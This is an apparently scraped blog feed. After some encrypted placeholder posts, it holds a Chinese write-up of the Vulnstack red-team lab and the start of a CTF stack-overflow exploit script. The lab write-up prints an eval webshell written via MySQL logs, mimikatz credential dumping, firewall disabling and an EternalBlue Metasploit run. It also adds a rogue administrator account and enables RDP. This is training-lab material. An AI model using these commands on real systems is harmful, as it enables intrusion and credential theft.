efc992a2f8146c85dd9af7980cf55bc62ef3e02b4db3859644d25cbe4a2bdce6c30089770edf9f53f99e896cb3463207df3aa98f04ad28e313e6c1bd9d7663e7363f722fd2147b2077228749129a24c59a83633bd90f25c0abc1121e3861b5e3e688af2ac95ae686602a8c6ae62dd9a52c7f116390ce7f82f38e42a69ffac039f5c9dd5b5fd48fa6b8255774735c918277f0fe79c902a56b33136ef0f53ced9a1fb4610e38cc4f38de2c01e12e257bffb3313bdf477832dd79322c7962577a36fcb286cd535fe8f053022e932dc987a947d291c2f7d77f3129716beef5fb00503366476699f668d61cd6c9319127c0fa24237af1e49cbbdc97b873b7b77a400be337302565271da52821491632baf92bd7038fbb1b663cbafe2cb82515445a9d75095c53fa2c13045674119d4dc79a91d1fa62c7af13bfe8563a7c7f4db6fccc0a3d902a25e8ab8abda9d86f56cbe736ddc7fc453b44937c28030380ed2524e21cf7ae8f2af61699476fd9182c6f6a8981ae3bd9a6fc7f4e2bfe526c4b6389d431995859f1c1d2c1531d5ad3fc414f7160d86ec5d174f4a2b900f6610c9b08573b1e475b6b9280467c3d0a7f6c8350748206634f8a92a72d1c8292c99af4689ea5427ac5bf03003d205297a555dd6d973fcec043132379734160b57f1e5af4420898061a24d99594d1e76a203514315c3504588035408e313b16d4c402781e2324b0d5e30ac94b85215d702b09c49125c0aefae1811d817cfa66d9544e6f4af9b7f85f4135f7593b4c2de480508ef67f3138720ade5d6ab209d7f0f9bf9b2769d9144e907f31cf93934f04f178937819d1163853f2e159d2d3baa5bd5d50764bc4b958eb3c135232aae83b796984940ee57c04093d849a38a1f4a6cf18ab9cee4bbfb4b17df8bd828ff60febea770d773d0a6c564d71bdc4a0b6ba6be32205d7bb14b93a94234fc0df3dda1840ccc0e7bd4eac5bf893470cac923c14e14fa50d21eaa025b9f34e4c1f4fca789522c82470fdf42b8d46a4c53369d70c5e6eb5d190490856058e9ef8ed3d277dffa5c7a7a86ed3606d3c091373dad633f56e243fed6d0555dacf2a0f433bcf5ed516243a6c7662d8ff8af15639d8a37243aece8759986cae23d9225c21e50a758d8d4e53f5b0042e3582358eeef1f513762f0f2405a1f83bfcfbec53cc1921680d54fc36eef8e3d9619e79ff6ada661399edc1d70219d07c90ed42fd16c022e4c885b1b55648945ea0eb0789eb14a2320417e0aa71ecb45f7a49d1e23737d05ff9257aa561ccfc3e1407bc854cde6935087a11285afd0f989c0329297cbca09c9cc955b926dbae093c80c4fe87e27906a38e5d42ea9ef2c1676144079afbb9129b0af612ea0b019c679ac3b735766110dc265c0d60bc18c6f8a797d7b6f75b00af9fa3657456fecea9e79f0520fb029699078cf9425b7b4cd0cd88be703a6e6a8a4904f575dc93b9e4d834c8e752f176e107faf9d231307062547b7b841393135d9ba9aee4d6c2bae263c266171f00722856a97b385d51584e61c6804b6231087abaac9b7ac6dd2462787267557efb0fe50590bf1c3e9b4d7ab0013246a9d904401b3b85bf3f29ac16284cb42c1f81fa4393aa7a0ac7a80499afbe445f1fbcd6223b86395386711735d3149403114bd09eee19b7c9ba0e2c8b10cfe4a3771b5f5cec2af6a2209627b6df99e05c84708849b2b3582101a6223d7bec919d3aef5597f0a1f7343c5fdcbb797f3d0d7ee7a18172c9382a8b6dbf7ae08644a86dd3c93cae86e1a3328358a66783da4897243240ec90a8bea019c7ff80d00ecd0343340e9ced2a12172547c7983ae3c2129ab489eb33233adf687cb2a5b5f5c6c091ea800e1ac1a35aa760eebf32bc25af830b08e5e63997cbf24f083cfb87f76982c02868fe725c4cbfba5b88165e06caf0042f5b3b6c3bf3c4cd18ac06ec5184a528855691cfba7460f030fc6e6b785ff1cc24e0c27b0615897a79f237078c55342ec518ea929bd76b4953f0c978713f4433bd423e3263bd29977c14db8174ea2c8970a719ea44dc5be404f9346b4439892558b0b6324412b4de7c419bb420a0b23e48d259b1c24be68c67abeb8dc1d85dba55521653c662046df3118ad4bdbd7ebc8acd6d9014da0a91e4ca53fa22802b2e424a8b1dbcb6643ff802e13aac3a326ee4468962f7f5b265e1710a14a753ea331d8e8567fb0baee314e9b14f9b5ed714180dd739f1e9c3495440e552060f90230f0bdb42adbf05a282081a4107c6240cfd21dfc2187d43f9ff76eab89be77c8f274736bdd75a50e141c082f3dbc4c926168f47e73daec71548937a036b6eb511afd647365e82aef2db40869cad7e17bf50f1a6eaf37e1acf4a661835269bb46fbff4ec1b519a3509894ebbd082f7a0eddd1e1a81d8b7e9b6fd1eec486013fd53e03426a797767b2d5cd8332005bdd8d3670a4bab0ee83b3fb9342d5151606f3460517dfa92b2339f2c26c29f0711152e183f605a8c7eb394fd9d517ded78a571f51011bab784fef7585b5998579d5ac8735611f915a1c7948bcd79ba56fa16ee3a9d94cc839d8d0bbda0c8a1bd8cfae6759827299be30810d5726c4bf3d8feddbd857c8d9bcea7fb85f1d34c19d81379ba701d740cff4c679ea9b256ddbeb91343df14636ec2975ee0292ef6ab7df6e15ce35a1c9605c397589fefb1b0c603a55d76fb3f2b45f86b904bc8a0a50169d2282729a0848cc72b05993844161c6803f718f7dc430446b13b43bacd3309fcf4e7c23c1c7fe0fda17813741ce01b571988e896ed3834aa6ed19f09e9e58ba3f07d1321b1c186d435e29c7dc27659418276a43fd8526c3bdfc48189a89f795382e0241cf697865967a9d44621cbdd26e6f6d6e4f12699bb04065e0f589bbcfaf11543a108265bfc072c16e308400b2265f89779f4c53d06c1b06f85d84a4b76cb219a3ebee43680fd2c15aa7fd57d52a5ba0f99aa7b66f0c15da478778571d52c206158a5fb78afd932574e165368485c3233d643f9f8d401f0dd1bb894d0ea5d0aa4c726cae385ed4f82d251ca88bc2a930b4a245861b7666b6d5c013d4b4611cb92802bd455989087c11a59a0fa24db99ca69423985d264e7ea7dd89eae2e6fdf0c1cf33865da7e88a12d165e3835f327d176311539321694ef60bdb63127f80e352cc1a6a08fc187657da690dfbf4e93679f70145e0719bbacb66d61f4076e56da149c6180f76b16b5509f0f59b830250dfc6342c346c7ada283261e07942996b066d9adc550086337f9548d600a3151238f23a20603e9f81a67b7c9e604920e0ca1e86c0578b6be7576d47b4c44c3e50ce22ea33d364d1f11f020f9890f428d11a7e9a2aec10f2aeeb20d9c53bb5bedc3315131524ee07c1c071b6891c147a68360b06ae9c45caabe83bf1c7951b92dcf8bd0f76b6db8022f8141d610341d5f661106b50949b3739115a24fa284556fe7ba48bdaa5898c90f6bac8cf987f414e2854680b2e0561556c195dddfde73c00574dcf5c54f48055f6201255b02aeccbfdfaf366ab0a71f0769e85e9bce6f7248004b1f9ba9060e69bc18c1f23f2ca8f7c7010812e81c038c4142edbe45a6a8640579a81fc6dc016ebbc3f2224a54534efac9b3df9e9f0899847fced9a9cd8e00676328fbf1728e1b65f946bc7cbe71a536b310b013e63e6f1ab7b3dd17d4e058b34b14583cfca47fbb68c21c1b859f6376414a82a242c640537f2b504ada6e5074b83c268a871a3146653adb29117e4f5899d1f94773e3d7371f27b2e2c3624c615a123a325b2d45656f4a34bb9a6a3c570e7a766c5404bac31c99bb4dc0f4f78f1426692b96a54ab8a2f1f6b6861a815e9762a24c4ee407eaf4cc96fc0dbc891f3a89876ed0d8540823e946e97511d81687bbda711f458974098682a9eb6108a100f0436768088f05a20e60b8f7812b226839b36be325ac1a916a52d39a0fd39dc71da0092a855bed626584c58f5aeae6ef1957d30b51d58a5333b28baaf3cc301834aad3a669592f911566d38098d561c1a3362095d0c889fa00a9dadf355e9c327d4442f9e69bc29f0be4fc0de2828d3f3c542a878fb93797fc1c2ad52330665487ac814e89bdd18e52f81b13b4086f46835a779ff4f75a13a62b24a58385ac464e797caba351a81b7ec023079f765e3dd90ce89c4561e61cffc6427da86ee05c505229580e3368bd00d07f579b6707b59f7c1918f7ca7a106b397b3f7fa85bdf7b41ddd183fe014267c776fa364067dcf0b388a5f4d7fa6e9a7b422e415684594fd722007c29ffa2e714c5f37a55b2aa7b59b6d1803076ccc7ce8702c325f456e3ecbcd08297ada12271d1823dc594eeb9f6db0121516a8c25cbc5363b50d19d6af948f79f05e07c77def7a5bf01c4733d8fb7eb4e7f40cc7ac3f7ceb4a696fb461d8f90acb310b462cf69f917b0018a3f33e72734e6dee5351d4417365ba92e39acb8f8ad399f69c945419134ae736cfe5e63651d9ca49eaffd5150a0c47b03c23bef091b3e0829af32b8dbf9502712c7dbb35f23dc85bfcad001d9ac2af6c51a48a35d5e6d9815815d3d8390c53678ee2ed4fd38991c4591ddd8721faa59da2deb15417c263deff6886e42c4f70dbb7b9fc68488a926453ce0b33acc62fad09edcbb49df5eef44ffcbe85e07297192f886db9af7d3f32d3cd049f5fd2cd4eccb447291932fd8308e544e32cfbbd8044fefc4a9eb5aeccc193b68edd4f482c390ffed3af0c193a9a1f0e1dfeca8ae16127afc02856e27f5fcf1562015d55793e68d2271f91f3190e38e4915f10bf64b9a3826a0397f9c80c6d8fba798d779878c73d6e744c7cab17d006f3461059ae55cd918c6efce815f984c51e7338c7b0dba8be207fd1a1c104c52896f6eac0910df33c5b81c679b5162a12bca609f1ab541af4de029c4743d0cde43d1a97bfc78b0afa347e1e402a00f3a4c3c8367865b779c2ecd1554d06c8c15df2d6d0fca1ac33615318b0feb2046ce15b310ddcd8f9c1380d6aa126a85da70676c12afb1a8e4a9c282a22ede1c7bf4bc0d24d885f09f6ff0a05a2c7365c58a900a59c47bcd8d9b2b058855da162f4575494f037bd7394e7ffba2b1a27a82999ab0710bc9c7053f3de407eea7eb258a7bcf418957609eb5c8ea79d3ab15987567fdaa4f09801d6d458e6836fbca0c49d5a2728b580dc50156d985397d29643584e31dfad2638693b555f7299ff652dc17e7821fd13e16945aba5759d35aebed6674522e5966f9258cc3a26a0e99c930da9b3201be664fa713fc09add8330c246aab836b95dbc2b1b7104a65e84f0f5c9b838a1892d8831a8def3374cae6ba47012468663a91e6262ed256f0d956971078975c3dd393e3d03a2231ae93e0d728ed8e271a2a20f45c2d1c4c38a000f07f2c417c143da793edaf3f2e5dccd723316ee98e4bdc584e577b291c5008d1e4639bcf08cce9ff658be3f8be822d613156945ef6f1262d18ea4f3c4e7ff793a81add3a9ff763c4ccce9b385704d95a6b33362aaf09b0536bab0365803ee73aca7f17c8903fdf175714bac15b3fdb928e049c51b7dcc05f7422b741c4705afee5074764ba5065ac386700cac207b741859a0a49f4f1634d4b97b45103432a5034bc3383c9a785f7dc3118c2056b2984d07fcc35ebc0a87a06977b26e72860845d5d7a09c0af377b4a4044773fc02888b5b37f143c1664881040f65e82a0d343910045bf6e78c88f1dab52ebecebeba229e81c17030218d39abdb464820e053c3594394aad1249f30dfa39958dcaf04d4f3cd4fec703599a2d90fd4d8351a90844386f51e13051215c685a28f5ff974c1c1c69c6ed9ee3051c78b9e490f2f3411f18a5c3269de6833e0d0c7f4cf8cc38df24f706b83d164afbf6b1d11b8babbfb7c7b06241d4a33d3c0da017d7a2e71795027dab9ba9424fcd5a55a33325e85497f0d23d6f9e49a41491dbb210c201d0efad18e22731408b00006f1502cac244660f9fee0cf023c96c7e1926f80480a15f1583e01ae3ed317db50c2d6e4fb5fdd1b7c5901d57ab2de512e95bc19757c708fb1d96d045cb9b531fc8a20070ecca169a47cf72c19f3544bea8e2db07043c3d3c43793104553ba2aebf56bd9fa3515b6c2ecbc144859657094a0d240e858685e25875f46b0c6af34faa053a8d15</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.Introduction To The Windows API 对windows API的介绍</title>
      <link href="/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2024/10/03/7.Introduction%20To%20The%20Windows%20API%20%E5%AF%B9windows%20API%E7%9A%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="87f6cd3add92e5f681beb51e2a86bf4fd7387a34d555675e20c6c8bd558de3d2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.Windows Architecture Windows架构</title>
      <link href="/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/"/>
      <url>/2024/10/01/5.Windows%20Architecture%20Windows%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4a2ce63102b6bd36fa38f56c121a3bf3b5748e9a69b0eb8678d15e89c6a6c14f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-1</title>
      <link href="/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/09/27/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网络拓扑：<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p><p>初始的密码都是 <code>hongrisec@2019</code>，部分可能要重置密码</p><p>域环境的网段是写死的 192.168.52.0&#x2F;24</p><p>在C盘找到 phpstudy 启动服务<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="phpmyadmin写马"><a href="#phpmyadmin写马" class="headerlink" title="phpmyadmin写马"></a>phpmyadmin写马</h2><p>访问站点是一个 phpstudy 探针<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p><p>扫下端口，注意开了 3306 端口<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>有防火墙</p><p>dirsearch 速扫<br><img src="/Rxi134_FILE/2838396d0573f8459b81f3b52a7399b5_MD5.jpeg"></p><p>&#x2F;readme 查看到版本为 3.5.8.2<br><img src="/Rxi134_FILE/649c61ddd29d4580811dfdcc03f4972f_MD5.jpeg"></p><p>root:root直接进后台了<br><img src="/Rxi134_FILE/3a56f2a12461d4fad5ecfe87ef16074f_MD5.jpeg"></p><p>第一步肯定是写马，通过phpinfo页面泄露了网站绝对路径 C:&#x2F;phpStudy&#x2F;WWW<br><img src="/Rxi134_FILE/78453fa6fde1da6dbad9fbc2caeabc09_MD5.jpeg"></p><p><code>show global variables like &quot;secure%&quot;</code>  无权直接写<br><img src="/Rxi134_FILE/8b5f038fc0e8113cf2f25a5e102a53a6_MD5.jpeg"></p><p><code>show variables like &#39;%general%&#39;;</code>  查看日志状态<br><img src="/Rxi134_FILE/e062de56aa4d26682f87334d618d01f3_MD5.jpeg"></p><p>打开日志写马</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token string">"on"</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">"C:\\phpStudy\\WWW\\fuck.php"</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token string">"&lt;?php eval($_POST[pwd]); ?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>蚁剑连上去<br><img src="/Rxi134_FILE/22dcfc7cf6830bfcd2f039159866ae1e_MD5.jpeg"></p><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>拿到了shell，不过发现有一个 yxcms 目录（数据库里也有 newycms ）<br><img src="/Rxi134_FILE/5851e7a33c9394a25dc4c433b7c37f4d_MD5.jpeg"></p><p><img src="/Rxi134_FILE/075fe84d667cd331805108e924180898_MD5.jpeg"></p><p>直接进入后台<br><img src="/Rxi134_FILE/60ad05e0511dbd0dcd4373500a1793b0_MD5.jpeg"><br>这边在前台发现可以更改网站模板<br><img src="/Rxi134_FILE/542275ea3a4be53c9a4eaeaf2b637cc0_MD5.jpeg"></p><p>在网上查阅资料，模板文件位于 <code>/protected/apps/admin/view/</code> 下<br><img src="/Rxi134_FILE/cdd86ad2510038db60db1008bbdaf1a0_MD5.jpeg"></p><p>写入webshell即可</p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h2><p>这边发现web服务器处在 GOD 域<br><img src="/Rxi134_FILE/62bde2c055f864a41df2359c7d2fc81b_MD5.jpeg"></p><p>使用 frp 作为反向代理，反弹shell到msf<br><img src="/Rxi134_FILE/a9893884ef8ead61d86368998319d2ad_MD5.jpeg"><br><img src="/Rxi134_FILE/44f4483735f8b10879da4eab5d036ba8_MD5.jpeg"></p><p>ipconfig &#x2F;all 发现了其它网段：192.168.52.0&#x2F;24</p><p>给 msf 添加一段 session 路由：<br><img src="/Rxi134_FILE/5dc634869627198f50e88c8072ad3f26_MD5.jpeg"></p><p>利用proxychains 实现内网代理<br><img src="/Rxi134_FILE/d08d392b01088f46c2e8d78e40ad90c4_MD5.jpeg"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>win7机器。主机名为 STU1<br><img src="/Rxi134_FILE/4888e3a5a05fa13d29462b3eb307baa9_MD5.jpeg"><br><img src="/Rxi134_FILE/2423b262365f3d131f5747fd526d113f_MD5.jpeg"></p><p>管理员权限，直接迁移进程到 lsass.exe<br><img src="/Rxi134_FILE/48c6914e05b0a6d30470d24219dc58dc_MD5.jpeg"></p><p>mimikatz 抓取明文密码：<code>god\Administrator:hongrisec@2019</code><br><img src="/Rxi134_FILE/ac5dbe258bda12ef7271887dd5ec77de_MD5.jpeg"></p><p>windows防火墙处于开启状态，直接关闭</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a0ad78682d9f162654779ff0317b14aa_MD5.jpeg"></p><p><code>net view /domain</code>查看有几个域，只有GOD一个域<br><img src="/Rxi134_FILE/0f29f7520a5a593a4b331285e14e9af9_MD5.jpeg"></p><p><code>net view /domain:GOD</code>查看GOD域内所有主机<br><img src="/Red_FILE/7d6c6afce54bef7142e2bcb011f4dfda_MD5.jpeg"></p><p><code>net group /domain</code> 查看域用户组<br><img src="/Rxi134_FILE/f23f2d20a63f6b909801c35a6d5e5317_MD5.jpeg"></p><p><code>net group &quot;Domain Controllers&quot; /domain</code> 确定DC<br><img src="/Rxi134_FILE/944a26e6658ee835bff7b566f2e3ae1f_MD5.jpeg"></p><p>既然在域内，利用 netbios协议 探测内网主机<br><img src="/Rxi134_FILE/25c5c05f8140aede807e09a51bd922ba_MD5.jpeg"><br>确定 141 的域PC ，和 138 的DC</p><h2 id="永恒之蓝攻破DC、域PC"><a href="#永恒之蓝攻破DC、域PC" class="headerlink" title="永恒之蓝攻破DC、域PC"></a>永恒之蓝攻破DC、域PC</h2><p>通过msf搭建socks5隧道<br><img src="/Rxi134_FILE/7190ed049d8a421673767639b2135e54_MD5.jpeg"></p><p>proxfier 检查<br><img src="/Rxi134_FILE/4a880d027642c2a0b6f1b0d6faa982f0_MD5.jpeg"></p><p>然后设置浏览器代理<br><img src="/Rxi134_FILE/939fb88fca8c009f7fbb65f45fd6424e_MD5.jpeg"></p><p>成功访问到内网里 DC 的80端口<br><img src="/Rxi134_FILE/4eb1cbb89f9311facea2a54ee1beecce_MD5.jpeg"></p><p>端口扫描，利用  proxychains 将我们的流量带入内网</p><p>138 DC端口开放情况：<br><img src="/Rxi134_FILE/f28880db586a6aa81d22407edf3c5fe8_MD5.jpeg"></p><p>141 域PC端口开放情况：<br><img src="/Rxi134_FILE/194285cc6d827ef391a6b7dc176d4ef7_MD5.jpeg"></p><p>很敏感想到永恒之蓝<br><img src="/Rxi134_FILE/56e0d75fedfb5066f1a0d1bae4133ed2_MD5.jpeg"></p><p>先打DC</p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbluemsf6 &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpmsf6 &gt; set rhosts 192.168.52.138msf6 &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是反弹shell失败了，网上查阅永恒之蓝直接反弹shell的几率还是不大的</p><p>这边使用 admin&#x2F;smb&#x2F;ms17_010_command 来执行命令<br><img src="/Rxi134_FILE/8c31fb6cec07c86d799101be58d71c2e_MD5.jpeg"></p><p>那就简单了，添加一个用户并加入管理员，同时开启远程桌面</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">set</span> command net user x1nri Zzx<span class="token punctuation">.</span>123 <span class="token operator">/</span>addnet user x1nri <span class="token operator">/</span>active:yesnet localgroup Administrators x1nri <span class="token operator">/</span>addreg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>fnetsh advfirewall firewall add rule name=<span class="token string">"允许RDP"</span> protocol=TCP <span class="token function">dir</span>=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置 proxifier 代理规则<br><img src="/Rxi134_FILE/00ceda9c0016f0832a563c6231c8db56_MD5.jpeg"></p><p>远程桌面登录 <code>god\x1nri:Zzx.123</code>，拿到 DC 的 shell<br><img src="/Rxi134_FILE/23a2af87a7ffda74e88781eaed7fc00d_MD5.jpeg"></p><p>上传mimikatz，以管理员运行抓取密码</p><pre class="line-numbers language-mimikatz" data-language="mimikatz"><code class="language-mimikatz">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/70fe24cc8636b188b0930577bcec469b_MD5.jpeg"><br>抓取到密码（环境搭建时改的密码）：<code>liukaifeng01:HONGRISEC@2019</code>，但是并没有抓取到administrator的密码</p><p>选中快速编辑，方便复制黏贴<br><img src="/Rxi134_FILE/de5d490af01e9a90d3a0ad717bd8cfcd_MD5.jpeg"></p><p>跳板机无法运行frp<br><img src="/Rxi134_FILE/c09bb9abe5947989b47e91dce7ede880_MD5.jpeg"></p><p>关闭防火墙，正连拿到shell<br><img src="/Rxi134_FILE/c558ddc843f8c9a589e8be82428568da_MD5.jpeg"></p><p>同理，利用永恒之蓝再拿到域 PC shell </p><h1 id="利用CS"><a href="#利用CS" class="headerlink" title="利用CS"></a>利用CS</h1><p>这边利用CS再走一遍流程（对CS不太熟，加深下理解），这里使用的是二开的CAT CS</p><p>设置一个beacon_http的监听器，监听80端口<br><img src="/Rxi134_FILE/e2621704b1231742b5ea146581e5d4a1_MD5.jpeg"></p><p>上线webserver，直接拿到了administrator权限<br><img src="/Rxi134_FILE/07d69db871fd49c5e67a8d126118e452_MD5.jpeg"></p><p>设置心跳时间（这里不是真实环境直接设为0了）<br><img src="/Rxi134_FILE/82e77dc5fb7aef4133d9651f2df74207_MD5.jpeg"></p><p>通过自带模块 getsystem 提升权限到SYSTEM，再通过进程注入返回一个新的shell<br><img src="/Rxi134_FILE/25b63f034b9008bc32f18d9b32f215a5_MD5.jpeg"></p><p>net view探测域内主机<br><img src="/Rxi134_FILE/33b1dc2afcbab5f2afb38ef6cf43a33f_MD5.jpeg"></p><p>上一个fscan内网大保健<br><img src="/Rxi134_FILE/79f4a4425c10ad714d943c7f01d71fca_MD5.jpeg"></p><p>我用的二开CS，不能直接派生会话给msf，只能重新上马了</p><p>在 跳板机 上设置一个新的代理监听器<br><img src="/Rxi134_FILE/57a05d38484ff210802fc0ba4bb1dfc0_MD5.jpeg"></p><p>之后就是正常ms17_010的利用，略</p><p>总结：CS真方便哇</p>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯京津冀2024初赛</title>
      <link href="/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="flowershop：简单栈溢出"><a href="#flowershop：简单栈溢出" class="headerlink" title="flowershop：简单栈溢出"></a>flowershop：简单栈溢出</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'请输入你的选项:'</span><span class="token punctuation">,</span>choice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shop</span><span class="token punctuation">(</span>buy<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'请输入购买的商品序号:'</span><span class="token punctuation">,</span>buy<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'你想要继续买花吗? 1/0'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'pwn'</span>payload<span class="token 